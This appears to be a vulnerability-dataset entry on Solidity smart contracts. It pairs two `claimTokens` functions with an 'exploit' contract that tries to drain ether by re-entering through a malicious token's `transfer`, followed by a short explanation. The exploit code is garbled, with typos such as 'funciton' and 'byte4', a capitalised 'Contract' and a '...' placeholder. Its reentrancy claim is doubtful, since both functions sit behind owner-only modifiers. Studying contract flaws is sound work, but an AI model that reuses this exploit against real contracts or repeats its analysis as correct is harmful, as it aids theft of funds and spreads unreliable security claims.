## Vulnerable Code

```javascript
**Instance_1**
function claimTokens(address _token, address _to) public onlyDonationAddress {  //modifier
        require(_to != address(0), "Wallet format error");
        if (_token == address(0)) {
            _to.transfer(address(this).balance);     //Vulnerable position_1
            return;
        }

        ERC20Basic token = ERC20Basic(_token);
        uint256 balance = token.balanceOf(this);
        require(token.transfer(_to, balance), "Token transfer unsuccessful");    //Vulnerable position_2
    }
    
    
**Instance_2**
function claimTokens(address _token, address _to) public onlyOwner {
        require(_to != address(0), "to is 0");
        if (_token == address(0)) {
            _to.transfer(address(this).balance);
            return;
        }

        StandardToken token = StandardToken(_token);
        uint256 balance = token.balanceOf(address(this));
        require(token.transfer(_to, balance), "transfer failed");
}//out6532
```



## Exploit Code

```javascript
contract ERC20Basic{

}
Contract Attack is ERC20Basic{
    uint count;
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton transfer(address to, uint256) payable{
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256(“claimTokens(address , address)”)), this, ...);
        }
    }
    function() payable{

    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position_2: IF the paramete of '_token' is transformed from a malicious address, the method of "transfer" can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim. ps:"...." represent an appropriate paramete.
